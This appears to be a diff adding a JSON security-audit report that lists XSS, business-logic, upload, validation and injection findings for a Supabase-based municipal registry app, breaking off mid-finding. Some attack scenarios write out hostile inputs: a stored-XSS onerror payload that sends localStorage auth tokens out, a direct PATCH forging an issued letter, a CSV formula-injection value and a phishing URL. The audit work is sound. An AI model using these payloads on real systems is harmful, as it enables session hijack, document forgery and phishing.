@@ -1,0 +1,324 @@
+{
+  "agent": "audit-appsec",
+  "head": "9950f16e426eedd586c6fd85f6c328d9923542d1",
+  "summary": {
+    "severity_counts": { "Critical": 0, "High": 2, "Medium": 3, "Low": 4, "Info": 1 },
+    "scope": "OWASP Top 10 code review: injection (SQL, PostgREST filter strings), XSS (sinks, in-house letter sanitiser, print surfaces), CSRF, input validation (Zod vs DB), error handling, file upload, security headers/CSP, open redirect, clickjacking, mass assignment.",
+    "method_notes": "All 90 migrations searched for dynamic SQL; latest definitions resolved for enforce_workflow_transition (00046), verify_service_letter (00064), service_request policies (00061), storage buckets (00001/00004/00014/00048/00072). sanitizeLetterHtml exercised under jsdom with 16 bypass payloads (raw/appsec-sanitiser-fuzz.txt). All 11 client storage upload call sites enumerated (raw/appsec-uploads.txt). All 14 .or()/.ilike() filter constructions enumerated (raw/appsec-injection-scan.txt). No live DB or deployed URL was reachable."
+  },
+  "findings": [
+    {
+      "id": "WP-APP-001",
+      "title": "Stored XSS: letter-template editor writes unsanitised service_type.letter_body_html into the live DOM via innerHTML",
+      "severity": "High",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N (6.1)",
+      "confidence": "Confirmed",
+      "category": "XSS",
+      "module": "Settings",
+      "refs": { "insa": ["C-02"], "owasp_top10": ["A03:2021"], "owasp_api": ["API8:2023"], "asvs": ["V5.3.3", "V5.2.1"], "iso27001": ["A.8.28"], "nist_csf": ["PR.DS-10"] },
+      "evidence": [
+        { "path": "src/components/settings/LetterTemplatesTab.tsx", "line": 71, "snippet": "setHtml(selected.letter_body_html ?? plainTextToHtml(selected.letter_body_template ?? \"\"));" },
+        { "path": "src/components/settings/LetterTemplatesTab.tsx", "line": 243, "snippet": "<RichTextEditor value={html} ..." },
+        { "path": "src/components/ui/rich-text-editor.tsx", "line": 46, "snippet": "if (el && el.innerHTML !== value) el.innerHTML = value || \"\";" },
+        { "path": "src/components/settings/LetterTemplatesTab.tsx", "line": 79, "snippet": "const clean = sanitizeLetterHtml(html);  // client-side only, on save" },
+        { "path": "supabase/migrations/00000000000000_baseline.sql", "line": 1649, "snippet": "CREATE POLICY service_type_update ... USING (((is_super_admin() OR (woreda_id = get_user_woreda_id())) AND (is_super_admin() OR user_has_any_perm(ARRAY['tenant.manage'::text]))));" },
+        { "path": "src/lib/security-headers.ts", "line": 52, "snippet": "\"script-src 'self' 'unsafe-inline'\"," },
+        { "path": "src/integrations/supabase/client.ts", "line": 24, "snippet": "storage: typeof window !== \"undefined\" ? localStorage : undefined," }
+      ],
+      "description": "The in-house sanitiser (sanitizeLetterHtml) is applied on the print route, at issuance, in the preview, and before save, and it held up against 16 bypass payloads under jsdom (raw/appsec-sanitiser-fuzz.txt). The gap is one sink that does not go through it. When the Letter Templates tab opens, it auto-selects the first letter type (LetterTemplatesTab.tsx:65-67) and passes the stored letter_body_html straight to RichTextEditor, which assigns it to a contentEditable div's innerHTML in the live document. Sanitisation happens only in the browser that saves the template. Nothing server-side (no CHECK, no trigger) prevents a direct PostgREST PATCH of service_type.letter_body_html. Setting innerHTML on a live element runs inline event handlers such as <img src=x onerror=...>. The CSP allows 'unsafe-inline', so it does not stop them. The regression test service-letter-sanitizer-parity covers only the print and issuance paths, not the editor.",
+      "attack_scenario": "A tenant_admin (or a super_admin, including one whose console role is restricted) sends PATCH /rest/v1/service_type?service_type_id=eq.<first letter type> {\"letter_body_html\":\"<img src=x onerror=fetch('https://<supabase>/rest/v1/audit_log',{method:'POST',...,body:localStorage['sb-...-auth-token']})>\"}. When a second tenant_admin of the same woreda opens Settings > Letter templates, the payload runs in their session. It can read their access and refresh tokens from localStorage and act as them, for example inviting users, editing role_permission, or approving work. The actions appear in the audit trail under the victim's identity.",
+      "impact": "Session hijack and non-repudiable impersonation of another tenant administrator. The attacker needs tenant.manage, which limits the privilege gain. The persistence and audit-attribution impact is still real, and stored XSS is rated High under the audit rubric (CVSS 6.1 reflects PR:H).",
+      "recommendation": "Run sanitizeLetterHtml() on every value before it reaches an HTML sink, including RichTextEditor's innerHTML assignment and the initial setHtml(). Prefer DOMPurify with the same allow-list in place of the hand-rolled walker. Add server-side defence: a BEFORE INSERT/UPDATE trigger on service_type that rejects letter_body_html containing on*= attributes, <script, <img, <svg, <iframe or javascript:, or move template saving behind an RPC that sanitises. Extend the parity regression test to cover the editor and preview sinks. See WP-APP-003 for the CSP half.",
+      "secure_fix_example": "// rich-text-editor.tsx\nimport { sanitizeLetterHtml } from \"@/lib/letterTemplate\";\nuseEffect(() => {\n  const el = ref.current;\n  const safe = sanitizeLetterHtml(value || \"\");\n  if (el && el.innerHTML !== safe) el.innerHTML = safe;\n}, [value]);\n// LetterTemplatesTab.tsx:71\nsetHtml(sanitizeLetterHtml(selected.letter_body_html ?? plainTextToHtml(selected.letter_body_template ?? \"\")));",
+      "effort": "S",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-002",
+      "title": "Issued service letters stay mutable: the public verification page attests client-written, post-issuance-editable fields, and reprints render from the live template instead of the issued snapshot",
+      "severity": "High",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N (7.7)",
+      "confidence": "Likely",
+      "category": "Business Logic",
+      "module": "Services",
+      "refs": { "insa": ["C-06", "MC-02"], "owasp_top10": ["A04:2021", "A08:2021"], "owasp_api": ["API3:2023", "API6:2023"], "asvs": ["V1.11.1", "V11.1.2", "V4.1.3"], "iso27001": ["A.8.26", "A.5.33"], "nist_csf": ["PR.DS-06"] },
+      "evidence": [
+        { "path": "supabase/migrations/00000000000046_task10_credential_lifecycle.sql", "line": 166, "snippet": "IF NEW.status IS NOT DISTINCT FROM OLD.status THEN\n    RETURN NEW;" },
+        { "path": "supabase/migrations/00000000000061_task14b_service_request_fsm.sql", "line": 45, "snippet": "CREATE POLICY service_request_update ... USING (woreda_id = get_user_woreda_id() AND user_has_any_perm(ARRAY['service.create', ... 'tenant.manage']))" },
+        { "path": "src/config/permissions.ts", "line": 373, "snippet": "P.SERVICE_CREATE,   // inside registry_clerk (line 358)" },
+        { "path": "src/routes/woreda.services.$requestId.index.tsx", "line": 293, "snippet": "extra: { issued_by_user_id: actorUserId, issued_at: new Date().toISOString(), issued_letter_html: issuedHtml || null, letter_summary: summary || null }" },
+        { "path": "supabase/migrations/00000000000064_task14b_verify_letter_completed_status.sql", "line": 33, "snippet": "COALESCE(sr.letter_summary, sr.purpose),   -- plus sr.subject, sr.issued_at, resident via sr.resident_id" },
+        { "path": "supabase/migrations/00000000000000_baseline.sql", "line": 997, "snippet": "IF NEW.verification_token IS NULL OR NEW.verification_token = '' THEN NEW.verification_token := public.gen_letter_verification_token();" },
+        { "path": "src/routes/woreda.services.$requestId.print.tsx", "line": 77, "snippet": "const templateHtml = data.service_type?.letter_body_html ?? plainTextToHtml(...);  // live template, not issued_letter_html" },
+        { "path": "supabase/migrations/00000000000013_receipt_verification.sql", "line": 87, "snippet": "RAISE EXCEPTION 'receipt.verification_token cannot be changed once assigned';  // receipts and credentials have this guard; letters do not" }
+      ],
+      "description": "Letters are the second public verification surface (/verify/letter/$token -> verify_service_letter()). The values that function attests are letter_summary, subject, issued_at, the resident resolved through resident_id, and the token itself. All of them are plain service_request columns written by the browser. letter_summary and issued_at are computed client-side at issuance (services.$requestId.index.tsx:273-297). After issuance nothing freezes them. The shared FSM trigger returns early when status is unchanged (00046:166). The payment and issuance gates (00062) act only on status transitions. The preconditions and checkpoint triggers only check that a new resident_id belongs to the same woreda. The UPDATE policy admits any holder of 13 service permissions, including registry_clerk via service.create. The verification token is accepted from the client on INSERT when non-empty and is never guarded on UPDATE. By contrast, receipt.verification_token (00013:87) and residence_credential.credential_number/qr_payload (00046:39-47) are made immutable by triggers. Separately, the print route re-renders from the current service_type template and never reads the issued_letter_html snapshot, so a reprint after a template edit does not match what was issued.",
+      "attack_scenario": "A registry_clerk sends PATCH /rest/v1/service_request?service_request_id=eq.<completed letter> {\"letter_summary\":\"Confirms monthly income of 50,000 ETB\",\"issued_at\":\"2025-01-01T00:00:00Z\",\"resident_id\":\"<another active resident in the woreda>\"}. Status is unchanged, so the FSM, payment and issuance gates do not fire. The already-printed QR now resolves on the public page to the new text, date and person. The clerk could also give a fresh request a chosen, guessable verification_token at INSERT, or rotate a token so an existing paper letter stops verifying.",
+      "impact": "The integrity of an official, publicly verifiable document is lost. A third party (bank, court, employer) scanning the QR sees attacker-chosen content presented as issued by the woreda. Only the generic updated_at changes. workflow_status_history records nothing because the status did not change.",
+      "recommendation": "Add a BEFORE UPDATE trigger on service_request that, once OLD.status is in ('issued','completed','resolved','closed') or OLD.issued_at IS NOT NULL, rejects any change to letter_summary, issued_letter_html, subject, purpose, details, applicant_name, resident_id, service_type_id, issued_at, issued_by_user_id and verification_token. Always generate verification_token server-side, ignoring client values, and make it immutable. Set issued_at = now() server-side on the transition into 'issued'. Build the snapshot server-side (RPC) rather than from client-rendered HTML. Have the print route render issued_letter_html when present. Audit every post-issuance change.",
+      "secure_fix_example": "CREATE OR REPLACE FUNCTION public.freeze_issued_service_letter() RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public' AS $$\nBEGIN\n  IF OLD.issued_at IS NOT NULL AND (\n     NEW.letter_summary IS DISTINCT FROM OLD.letter_summary OR NEW.issued_letter_html IS DISTINCT FROM OLD.issued_letter_html OR\n     NEW.subject IS DISTINCT FROM OLD.subject OR NEW.resident_id IS DISTINCT FROM OLD.resident_id OR\n     NEW.issued_at IS DISTINCT FROM OLD.issued_at OR NEW.verification_token IS DISTINCT FROM OLD.verification_token) THEN\n    RAISE EXCEPTION 'service_request: an issued letter is immutable' USING ERRCODE = 'check_violation';\n  END IF;\n  IF TG_OP = 'UPDATE' AND NEW.status = 'issued' AND OLD.status IS DISTINCT FROM 'issued' THEN NEW.issued_at := now(); END IF;\n  RETURN NEW;\nEND $$;\nCREATE TRIGGER zzzz_freeze_issued_service_letter BEFORE UPDATE ON public.service_request FOR EACH ROW EXECUTE FUNCTION public.freeze_issued_service_letter();",
+      "effort": "M",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-003",
+      "title": "CSP allows 'unsafe-inline' scripts and auth tokens live in localStorage, so any HTML-injection bug becomes full session takeover",
+      "severity": "Medium",
+      "cvss_v3_1": "",
+      "confidence": "Confirmed",
+      "category": "Config",
+      "module": "Platform",
+      "refs": { "insa": ["C-02", "C-04"], "owasp_top10": ["A05:2021"], "owasp_api": ["API8:2023"], "asvs": ["V14.4.3", "V3.2.3"], "iso27001": ["A.8.9"], "nist_csf": ["PR.PS-01"] },
+      "evidence": [
+        { "path": "src/lib/security-headers.ts", "line": 52, "snippet": "\"script-src 'self' 'unsafe-inline'\"," },
+        { "path": "src/lib/security-headers.ts", "line": 30, "snippet": "* script-src carries 'unsafe-inline' deliberately: TanStack Start's SSR emits two inline scripts" },
+        { "path": "src/integrations/supabase/client.ts", "line": 24, "snippet": "storage: typeof window !== \"undefined\" ? localStorage : undefined," },
+        { "path": "src/lib/security-headers.ts", "line": 95, "snippet": "if (contentType.includes(\"text/html\")) { headers.set(\"Content-Security-Policy\", contentSecurityPolicy()); }" }
+      ],
+      "description": "The other headers are well configured: HSTS 2y with includeSubDomains, X-Frame-Options SAMEORIGIN plus frame-ancestors 'self', nosniff, strict-origin-when-cross-origin, a Permissions-Policy limited to camera and geolocation, and object-src 'none', base-uri 'self' and form-action 'self'. script-src, however, allows 'unsafe-inline', which also permits inline event-handler attributes. The CSP therefore does not mitigate WP-APP-001 or any future injection. Supabase access and refresh tokens are kept in localStorage, so injected script can read them. Navigation-based exfiltration is not limited by connect-src. There is also no Trusted Types (require-trusted-types-for 'script'). The headers are applied only by src/server.ts. No vercel.json exists, and it is not verified that every HTML response on the live deployment passes through that wrapper.",
+      "attack_scenario": "Any stored or reflected HTML sink (for example WP-APP-001) can use inline handlers to run script, read localStorage['sb-<ref>-auth-token'] and replay the refresh token from anywhere.",
+      "impact": "The main browser-side defence-in-depth control is effectively absent against inline injection.",
+      "recommendation": "Move to per-request nonces for the two TanStack Start inline scripts ('nonce-<n>' 'strict-dynamic') and drop 'unsafe-inline'. Add require-trusted-types-for 'script' once the editor uses a sanitiser policy. Consider a shorter JWT expiry. Verify the headers on the production URL with curl -sI against the root, a deep link and the 404 page.",
+      "secure_fix_example": "script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types letter-html default",
+      "effort": "M",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-004",
+      "title": "File-upload constraints are client-side only for 8 of 10 buckets; SVG/any-type accepted on two paths; extensions come from client filenames; no magic-byte check or malware scanning",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)",
+      "confidence": "Confirmed",
+      "category": "Config",
+      "module": "Platform",
+      "refs": { "insa": ["C-08"], "owasp_top10": ["A04:2021", "A05:2021"], "owasp_api": ["API4:2023"], "asvs": ["V12.1.1", "V12.2.1", "V12.3.1", "V12.4.1"], "iso27001": ["A.8.7", "A.8.28"], "nist_csf": ["PR.DS-01", "DE.CM-09"] },
+      "evidence": [
+        { "path": "supabase/migrations/00000000000001_storage.sql", "line": 24, "snippet": "INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types) VALUES ('credential-request-documents', ..., 'f', NULL, NULL)  -- same NULL/NULL for 6 more buckets (lines 28-50)" },
+        { "path": "supabase/migrations/00000000000014_app_user_staff_fields.sql", "line": 24, "snippet": "VALUES ('staff-assets', 'staff-assets', 'f', NULL, NULL)" },
+        { "path": "supabase/migrations/00000000000048_task11_schema_gaps.sql", "line": 345, "snippet": "INSERT INTO storage.buckets (id, name, public) VALUES ('attachments', 'attachments', false)" },
+        { "path": "src/components/forms/ResidentWizardSteps.tsx", "line": 207, "snippet": "const handlePhotoUpload = async (file: File) => { ... size check only, no MIME check; SquircleUpload accept=\"image/*\"" },
+        { "path": "src/utils/imageCompression.ts", "line": 69, "snippet": "if (!CONVERTIBLE.has(file.type) || !supportsWebpEncoding()) return file;  // image/svg+xml passes through unchanged" },
+        { "path": "src/components/settings/UsersRolesTab.tsx", "line": 732, "snippet": "accept=\"image/*\"   // onFile() (line 685) checks size only; no MIME check" },
+        { "path": "src/routes/woreda.credentials.new.tsx", "line": 367, "snippet": "const ext = file.name.split(\".\").pop() ?? \"pdf\";" },
+        { "path": "src/routes/woreda.credentials.$requestId.index.tsx", "line": 330, "snippet": "window.open(data.signedUrl, \"_blank\", \"noopener\");  // non-PDF attachments opened top-level from the storage origin" }
+      ],
+      "description": "There are 10 private buckets. Only resident-documents (00004: 10 MB, PDF) and rental-request-documents (00072: 5 MB, PDF/JPEG/PNG) enforce size and MIME at the bucket level. The other 8 (attachments, credential-request-documents, credential-templates, resident-clearance-letters, resident-photos, service-request-documents, staff-assets, tenant-assets) rely on checks in React code that a direct Storage API call skips. Two UI paths have no MIME check at all: resident photo (ResidentWizardSteps) and staff photo/signature (UsersRolesTab). Both accept image/*, and toWebp() passes SVG through unconverted. Four paths derive the stored extension from the client filename (credentials.new x2, clearance letters, and storageExtension() for non-JPEG/PNG). Content-Type is always the client-declared file.type. No path inspects magic bytes. No AV or CDR scanning exists; the sha256 'checksum' is computed in the browser and never verified server-side. Non-PDF attachments open as a top-level document on the Supabase storage origin, so an uploaded text/html or image/svg+xml object would render there. Permission gating on storage.objects is covered separately by WP-DB-002 and is not repeated here.",
+      "attack_scenario": "A clerk (or anyone holding a woreda session, per WP-DB-001/002) uploads doc.svg (image/svg+xml) or a text/html file to the attachments bucket through the Storage API. The object is linked to a credential request. When a supervisor clicks it, the file opens top-level on <ref>.supabase.co and shows a credential-phishing page or drives downloads under a trusted government-looking URL. The same missing limits allow multi-GB uploads into any of the 8 buckets.",
+      "impact": "Malicious or active content can be stored in the evidence repository. Storage cost and availability can be abused. Malware can be distributed to staff who open scanned documents. The app origin's tokens are not directly exposed because the storage origin differs.",
+      "recommendation": "Set file_size_limit and allowed_mime_types on every bucket in a migration: images ['image/jpeg','image/png','image/webp'], documents plus 'application/pdf', never image/svg+xml or text/*. Derive extensions from a MIME allow-list map, never from file.name. Add MIME checks to the resident-photo and staff-assets uploaders. Validate magic bytes in an Edge Function or a storage webhook, and quarantine until scanned (e.g. ClamAV in an Edge Function), or record scanning as an accepted gap. Open non-PDFs through createSignedUrl(path, ttl, { download: true }) so they are served as attachments.",
+      "secure_fix_example": "UPDATE storage.buckets SET file_size_limit = 5242880, allowed_mime_types = ARRAY['image/jpeg','image/png','image/webp','application/pdf'] WHERE id IN ('attachments','credential-request-documents','resident-clearance-letters','service-request-documents');\nUPDATE storage.buckets SET file_size_limit = 5242880, allowed_mime_types = ARRAY['image/jpeg','image/png','image/webp'] WHERE id IN ('resident-photos','staff-assets','tenant-assets','credential-templates');",
+      "effort": "M",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-005",
+      "title": "Allow-list validation is client-only for FAN, phone, household email, free-text lengths and several forms; FAN uniqueness is advisory only",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (4.3)",
+      "confidence": "Confirmed",
+      "category": "Business Logic",
+      "module": "Residents",
+      "refs": { "insa": ["C-06", "D-02", "ET-12"], "owasp_top10": ["A04:2021"], "owasp_api": ["API6:2023"], "asvs": ["V5.1.3", "V5.1.4", "V11.1.3"], "iso27001": ["A.8.28"], "nist_csf": ["PR.DS-02"] },
+      "evidence": [
+        { "path": "src/lib/residentSchema.ts", "line": 36, "snippet": "national_id_no: z.string().trim()...refine((v) => !v || /^\\d{16}$/.test(v), ...)" },
+        { "path": "src/lib/phoneNumber.ts", "line": 59, "snippet": "return v === \"\" || /^\\d{9}$/.test(v);" },
+        { "path": "supabase/migrations/00000000000000_baseline.sql", "line": 597, "snippet": "ALTER TABLE public.resident ADD CONSTRAINT resident_email_format CHECK (...)  -- the only format CHECK on a PII column" },
+        { "path": "supabase/migrations/00000000000023_pii_encryption.sql", "line": 232, "snippet": "RETURN digits;  -- normalize_phone() accepts any digit string, never rejects" },
+        { "path": "supabase/migrations/00000000000044_task6_household_rent_national_id_pii.sql", "line": 89, "snippet": "trimmed := NULLIF(trim(_id), '');  -- blind index over the raw trimmed value" },
+        { "path": "src/components/forms/ResidentWizardSteps.tsx", "line": 167, "snippet": ".or(`national_id_no_blind_index.eq.${blindIndex}`)  // duplicate-FAN check is a client-side warning only" },
+        { "path": "src/routes/woreda.services.new.tsx", "line": 212, "snippet": "if (subject.trim().length < 3) e[\"subject\"] = ...  // hand-rolled, no Zod, no max length" },
+        { "path": "supabase/functions/invite-tenant-user/index.ts", "line": 69, "snippet": "if (!email || !full_name || !role || !woredaId) { return json(req, 400, ...) }  // presence only; no format/length/path-prefix checks" }
+      ],
+      "description": "Zod is used in 14 route files (matching docs/security-functionality.md), and DB CHECKs cover most status/enum columns (44 distinct named ADD CONSTRAINT ... CHECK constraints, plus inline CHECKs in later CREATE TABLEs). The identifiers named by the INSA checklist are not enforced server-side. No migration constrains resident.national_id_no to 16 digits. Phone numbers have no +251/9-digit CHECK, and normalize_phone() returns whatever digits it is given. household.email has no format CHECK. No unique index covers national_id_no_blind_index, and the blind index is computed over the trimmed raw string, so '1234 5678 ...' and '12345678...' produce different indexes. Forms outside the 14 (services.new, rental-houses.occupants.new, the letter-template editor, the invite dialogs) use ad-hoc or no validation, and free-text columns have no length limits in the DB. The invite Edge Functions check only that fields are present. email format, full_name/department/job_title length and the signature_path/photo_path prefix (which must begin with the caller's woreda) are not validated. These functions write with the service role, which bypasses the storage path convention.",
+      "attack_scenario": "A clerk bypasses the form with a direct PostgREST insert of a resident whose national_id_no is '1234-5678-9012-3456' (or a FAN that already exists, reformatted). No constraint fires, the duplicate check never matches, and the same person can be registered twice and issued two residence credentials.",
+      "impact": "Registry data quality and uniqueness guarantees (one FAN per resident) depend on the UI. Duplicate identities can be minted. Malformed phones break blind-index search.",
+      "recommendation": "Add CHECK constraints: national_id_no ~ '^[0-9]{16}$', phone_number ~ '^\\+2519[0-9]{8}$' (or the 9-digit local form actually stored), and household email format. Add length CHECKs on free-text columns. Add a partial UNIQUE index on (woreda_id, national_id_no_blind_index) WHERE national_id_no_blind_index IS NOT NULL, or platform-wide if policy requires. Normalise FAN digits before computing the blind index. Validate Edge Function bodies with a Zod/Valibot schema, including a signature_path/photo_path prefix of `${woredaId}/`. Update docs/security-functionality.md to list validation per module.",
+      "secure_fix_example": "ALTER TABLE public.resident ADD CONSTRAINT resident_fan_format CHECK (national_id_no IS NULL OR national_id_no ~ '^[0-9]{16}$') NOT VALID;\nCREATE UNIQUE INDEX resident_fan_unique ON public.resident (woreda_id, national_id_no_blind_index) WHERE national_id_no_blind_index IS NOT NULL AND active_flag;",
+      "effort": "M",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-006",
+      "title": "PostgREST .or() filter strings interpolate search input with partial escaping (only % and , removed)",
+      "severity": "Low",
+      "cvss_v3_1": "",
+      "confidence": "Confirmed",
+      "category": "Injection",
+      "module": "Platform",
+      "refs": { "insa": ["C-01"], "owasp_top10": ["A03:2021"], "owasp_api": ["API8:2023"], "asvs": ["V5.3.4"], "iso27001": ["A.8.28"], "nist_csf": ["PR.DS-10"] },
+      "evidence": [
+        { "path": "src/routes/woreda.residents.index.tsx", "line": 191, "snippet": "const escaped = search.replace(/[%,]/g, \"\"); ... q = q.or(clauses.join(\",\"));" },
+        { "path": "src/components/services/ServiceRequestList.tsx", "line": 195, "snippet": "q = q.or([`request_number.ilike.%${esc}%`, `applicant_name.ilike.%${esc}%`, ...].join(\",\"))" },
+        { "path": "src/routes/admin.audit.tsx", "line": 225, "snippet": "const esc = filters.q.replace(/[%,]/g, \"\"); query = query.or([...`entity_id.ilike.%${esc}%`].join(\",\"))" },
+        { "path": "src/routes/woreda.rental-houses.occupants.new.tsx", "line": 266, "snippet": ".replace(/[%,()*]/g, \"\")  // the better pattern, used in one place only" }
+      ],
+      "description": "There is no SQL injection. No migration uses dynamic EXECUTE (0 occurrences), every RPC takes typed parameters, and Edge Functions use supabase-js builders only. Eight .or() constructions (residents, households, services, credentials export, CredentialQueueTable, both audit pages, ResidentSearchPicker) interpolate user search text into PostgREST logic-tree syntax after stripping only '%' and ','. The characters '(', ')', '\"', '*' (a PostgREST wildcard) and '.' pass through. Without commas an attacker cannot add sibling predicates, and every query still runs under the caller's RLS, so the realistic effect is malformed-filter 400s (surfaced raw per WP-BQ-001) and wildcard broadening. That is no more than a user can already do by calling PostgREST directly.",
+      "attack_scenario": "Typing 'a)' or 'a\"' into a search box produces a PostgREST parse error, which is shown raw in a toast. No cross-tenant or cross-row access results.",
+      "impact": "Robustness and hygiene only. This does not violate C-01's intent, but it fails its literal criterion ('no user input interpolated into PostgREST filter strings').",
+      "recommendation": "Centralise one escaper that strips or escapes [%,()*\\\"\\\\.:] (as occupants.new.tsx does), or wrap values in double quotes with escaping. Better, move multi-column search into an RPC taking a text parameter.",
+      "secure_fix_example": "export const pgrstLike = (s: string) => `\"%${s.replace(/[\\\\\"]/g, \"\\\\$&\").replace(/[%*,()]/g, \"\")}%\"`;\nq.or(`full_name.ilike.${pgrstLike(search)},resident_number.ilike.${pgrstLike(search)}`);",
+      "effort": "S",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-007",
+      "title": "CSV formula-injection guard leaves an embedded carriage return (and ';' for semicolon-locale Excel) unquoted",
+      "severity": "Low",
+      "cvss_v3_1": "",
+      "confidence": "Likely",
+      "category": "Injection",
+      "module": "Platform",
+      "refs": { "insa": ["C-02"], "owasp_top10": ["A03:2021"], "owasp_api": [], "asvs": ["V5.3.10"], "iso27001": ["A.8.28"], "nist_csf": [] },
+      "evidence": [
+        { "path": "src/utils/tableExport.ts", "line": 33, "snippet": "const FORMULA_PREFIX = /^[=+\\-@\\t\\r]/;" },
+        { "path": "src/utils/tableExport.ts", "line": 38, "snippet": "return /[\",\\n]/.test(safe) ? `\"${safe.replace(/\"/g, '\"\"')}\"` : safe;" },
+        { "path": "src/utils/reportExport.ts", "line": 26, "snippet": "return /[\",\\n]/.test(s) ? `\"${s.replace(/\"/g, '\"\"')}\"` : s;" },
+        { "path": "docs/audit/2026-09-24/raw/appsec-csv-escape.txt", "line": 2, "snippet": "'x;=2+2' emitted unquoted" }
+      ],
+      "description": "All 13 CSV exports go through rowsToCsv/sectionsToCsv, which prefix a leading = + - @ TAB CR with an apostrophe. This is good practice and is verified in both modules. The prefix test applies only to the first character, and quoting is triggered only by '\"', ',' or LF. A value such as 'Abebe\\r=cmd|...' is emitted unquoted, and spreadsheet apps that treat a bare CR as a record separator start a new row whose first cell is the formula. In locales where Excel's list separator is ';', 'x;=1+1' likewise produces a formula cell.",
+      "attack_scenario": "A clerk stores a resident full_name containing a CR followed by a formula. An auditor later exports residents to CSV and opens it in a spreadsheet application.",
+      "impact": "Formula execution or link injection on an analyst workstation. The conditions are narrow and depend on the spreadsheet and locale.",
+      "recommendation": "Quote every field unconditionally, add \\r and ; to the quoting trigger, and apply the formula-prefix check after splitting on CR and LF as well.",
+      "secure_fix_example": "const esc = (s: string) => { const safe = /^[=+\\-@\\t\\r]/.test(s) || /[\\r\\n][=+\\-@]/.test(s) ? `'${s.replace(/\\r(?!\\n)/g, ' ')}` : s; return `\"${safe.replace(/\"/g, '\"\"')}\"`; };",
+      "effort": "S",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-008",
+      "title": "Landing page reflects attacker-supplied error_description text (content spoofing)",
+      "severity": "Low",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N (4.3)",
+      "confidence": "Confirmed",
+      "category": "Injection",
+      "module": "Platform",
+      "refs": { "insa": ["C-02"], "owasp_top10": ["A03:2021"], "owasp_api": [], "asvs": ["V5.2.1"], "iso27001": ["A.8.28"], "nist_csf": [] },
+      "evidence": [
+        { "path": "src/lib/authRedirect.ts", "line": 34, "snippet": "const description = params.get(\"error_description\") ?? hashParams.get(\"error_description\") ?? params.get(\"error\") ?? hashParams.get(\"error\");" },
+        { "path": "src/routes/index.tsx", "line": 109, "snippet": "<p className=\"mt-4 text-xs text-slate-400\">{description}</p>" }
+      ],
+      "description": "Any https://<site>/?error_description=... link renders the supplied string on the official domain inside the 'this link is no longer valid' card. React escapes the text, so this is not XSS, but it is arbitrary text shown on a trusted government origin.",
+      "attack_scenario": "An attacker sends staff https://<portal>/?error_description=Your%20account%20is%20locked.%20Call%20%2B251...%20to%20reactivate, which appears on the genuine portal.",
+      "impact": "Social-engineering aid only.",
+      "recommendation": "Map GoTrue error codes (error_code / error) to a fixed set of bilingual messages and never render free text from the URL.",
+      "secure_fix_example": "const KNOWN = { otp_expired: 'Link expired', access_denied: 'Link invalid' } as const;\nconst description = KNOWN[params.get('error_code') as keyof typeof KNOWN] ?? 'This link is no longer valid';",
+      "effort": "S",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-009",
+      "title": "Invite Edge Functions derive a globally-UNIQUE username from the email local part, leaving orphaned GoTrue users on collision",
+      "severity": "Low",
+      "cvss_v3_1": "",
+      "confidence": "Likely",
+      "category": "Business Logic",
+      "module": "Settings",
+      "refs": { "insa": ["C-06", "C-07"], "owasp_top10": ["A04:2021"], "owasp_api": ["API6:2023"], "asvs": ["V11.1.1"], "iso27001": ["A.8.28"], "nist_csf": [] },
+      "evidence": [
+        { "path": "supabase/functions/invite-tenant-user/index.ts", "line": 134, "snippet": "const username = email.split(\"@\")[0]?.slice(0, 32) ?? email;" },
+        { "path": "supabase/migrations/00000000000000_baseline.sql", "line": 536, "snippet": "ALTER TABLE public.app_user ADD CONSTRAINT app_user_username_key UNIQUE (username);" },
+        { "path": "supabase/functions/invite-tenant-user/index.ts", "line": 236, "snippet": "if (insertErr) { return safeError(req, ..., \"Invite sent but profile setup failed\", 400); }" }
+      ],
+      "description": "inviteUserByEmail() runs first and sends the email. The app_user insert then fails if any user in any woreda already has the same local part (abebe@gmail.com vs abebe@moe.gov.et). The invitee receives a working invite link for an auth user with no app_user row, and the admin gets a generic error. The collision also tells the inviter that the local part exists somewhere on the platform.",
+      "attack_scenario": "A tenant admin invites 'info@<domain>' and the invite partially fails because another woreda already has an 'info' user.",
+      "impact": "Orphaned auth.users rows, a confusing onboarding failure, and a minor cross-tenant existence signal.",
+      "recommendation": "Make the username unique per woreda or derive it with a random suffix. Insert app_user before sending the invite, or roll back the GoTrue user on insert failure.",
+      "secure_fix_example": "const username = `${email.split('@')[0]!.slice(0, 24)}-${crypto.randomUUID().slice(0, 6)}`;",
+      "effort": "S",
+      "status": "Open"
+    },
+    {
+      "id": "WP-APP-010",
+      "title": "Letter sanitiser observations: sound in the browser, but in-house (not DOMPurify), with an SSR regex fallback that is bypassable, unvalidated style values, and a stored-but-unrendered issued_letter_html",
+      "severity": "Info",
+      "cvss_v3_1": "",
+      "confidence": "Confirmed",
+      "category": "XSS",
+      "module": "Services",
+      "refs": { "insa": ["C-02"], "owasp_top10": ["A03:2021"], "owasp_api": [], "asvs": ["V5.2.1"], "iso27001": ["A.8.28"], "nist_csf": [] },
+      "evidence": [
+        { "path": "src/lib/letterTemplate.ts", "line": 64, "snippet": "return html.replace(/<(script|style|iframe|object|embed)\\b[^>]*>[\\s\\S]*?<\\/\\1\\s*>/gi, \"\");  // server fallback leaves <img onerror> intact" },
